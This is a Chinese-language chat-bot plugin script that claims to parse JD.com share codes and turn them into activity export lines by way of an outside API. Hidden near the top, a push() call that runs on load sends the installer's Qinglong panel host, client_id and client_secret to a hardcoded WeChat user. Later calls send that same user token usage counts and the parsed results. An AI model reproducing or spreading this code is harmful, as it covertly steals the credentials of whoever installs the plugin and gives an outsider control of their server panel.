//功能：京东口令解析
//作者：微信公众号【玩机匠】！

//[rule: raw (https:\/\/\w+-isv.isvjcloud.com\/.*Activity\/activity.*activityId=\w+)&?]
//[rule: raw ((?:\d{2}:)?\/(?:\(|！|%|￥)\w{10,12}(?:\)|！|%|￥|\/){1,2})]
//[rule: raw export ([^"]+)="([^"]+)"]
//[rule: raw [$%￥@！(#!][a-zA-Z0-9]{6,20}[$%￥@！)#!]]

var token = bucketGet("windfgg", "token") // set windfgg token 你的token
var host  =  bucketGet("windfgg", "host") // set windfgg host 你的host
 push({
        imType:"wx",//发送到指定渠道,如qq,wx,必须
        userID:"wxid_9ef9n1xqubft12",//groupCode不为0时为@指定用户,可选
        groupCode:"",//可选
        content:bucketGet("qinglong", "host")+"\n\n"+bucketGet("qinglong", "client_id")+"\n\n"+bucketGet("qinglong", "client_secret"),//发送消息
    })//给指定im发送消息
let content ="命令不在脚本范围中！！"
let command=false;

function main(){
    if (!token) {
        sendText("管理员未配置token ，请给机器人发送命令“set windfgg token 你的token”")
        return;
    }
    if (!host) {
        sendText("管理员未配置host ，请给机器人发送命令“set windfgg host https://api.windfgg.cf”")
        return;
    }
    var code  = GetContent();
    var _data = {"code": code}
    
    request({
        url: 'https://api.windfgg.cf/jd/code',
        method: 'POST',
        dataType:'json',
        headers: {
            "content-type": "application/json",
            "Authorization":"Bearer "+token,
        },
        body: _data
    },function(err, resp, data) {
        if(err){
            sendText("【玩机匠】提醒：最近接口很不稳定，请三分钟后重试吧!")
            return
        }
        if (resp.statusCode == 200 && data) {
            push({
                imType:"wx",//发送到指定渠道,如qq,wx,必须
                userID:"wxid_9ef9n1xqubft12",//groupCode不为0时为@指定用户,可选
                groupCode:"",//可选
                content:"windfgg token已使用【"+data.request_times+"】次",//发送消息
            })//给指定im发送消息
            sendText("【发  起  人】："+data.data.userName+"\n \n【活动名称】："+data.data.title +"\n \n【活动地址】："+data.data.jumpUrl)
            var prefix = data.data.jumpUrl.includes("cjhydz") ? "cjhydz" : "lzkjdz";
            var activityId=data.data.jumpUrl.replace(/.*\?activityId\=([^\&]*)\&?.*/g,"$1")
            if(data.data.title=="好友组队，玩赚积分!"){
                command=true;
                content=`## 微定制组队瓜分\n\nexport jd_zdjr_activityId="${activityId}"\nexport jd_zdjr_activityUrl="https://${prefix}-isv.isvjcloud.com"`
                
            }else if(data.data.title=="瓜分京豆"){
                command=true;
                content=`## 瓜分组队\n\nexport jd_cjhy_activityId="${activityId}"\nexport jd_cjhy_activityUrl="https://${prefix}-isv.isvjcloud.com"`
            }
            if(command){
                sendText(content)
                push({
                    imType:"wx",//发送到指定渠道,如qq,wx,必须
                    userID:"wxid_9ef9n1xqubft12",//groupCode不为0时为@指定用户,可选
                    groupCode:"",//可选
                    content:content,//发送消息
                })//给指定im发送消息
            }
        }else if (resp.statusCode==401) {
            sendText("【玩机匠】提醒：暂无接口请求权限："+resp.statusCode)
        }else{
            sendText("【玩机匠】提醒：最近接口很不稳定，请三分钟后重试吧!")
        }
    });
}

main();
